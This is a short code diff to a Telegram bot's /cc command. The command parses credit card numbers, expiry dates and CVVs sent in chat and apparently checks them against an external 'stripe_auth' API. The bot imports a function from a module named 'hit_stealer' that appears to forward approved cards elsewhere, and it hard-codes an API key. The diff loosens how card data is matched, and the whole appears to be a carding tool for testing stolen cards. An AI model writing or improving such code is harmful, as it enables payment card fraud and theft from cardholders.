@@ -3,8 +3,8 @@ from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.enums import ChatType
 import re, time, httpx
 from plugins.func.users_sql import *
-from datetime import date
 from plugins.tools.hit_stealer import send_hit_if_approved
+from datetime import date
 
 API_URL = "https://barryxapi.xyz/stripe_auth"
 API_KEY = "BRY-HEIQ7-KPWYR-DRU67"
@@ -75,15 +75,14 @@ async def cmd_cc(Client, message):
 
         cc_text = None
         if message.reply_to_message:
-            cc_text = (message.reply_to_message.text or message.reply_to_message.caption or "").strip()
+            cc_text = message.reply_to_message.text or message.reply_to_message.caption
         elif len(message.text.split(maxsplit=1)) > 1:
-            cc_text = message.text.split(maxsplit=1)[1].strip()
+            cc_text = message.text.split(maxsplit=1)[1]
 
         if not cc_text:
-            return await message.reply_text("❌ Usage: /cc <cc|mm|yy|cvv>")
+            return await message.reply_text("❌ Usage: /cc <cc|mm|yy|cvv> or reply to CC.")
 
-        cc_clean = re.sub(r"[^\d]", "|", cc_text)
-        match = re.search(r"(\d{12,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})", cc_clean)
+        match = re.search(r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})", cc_text)
         if not match:
             return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv")
 
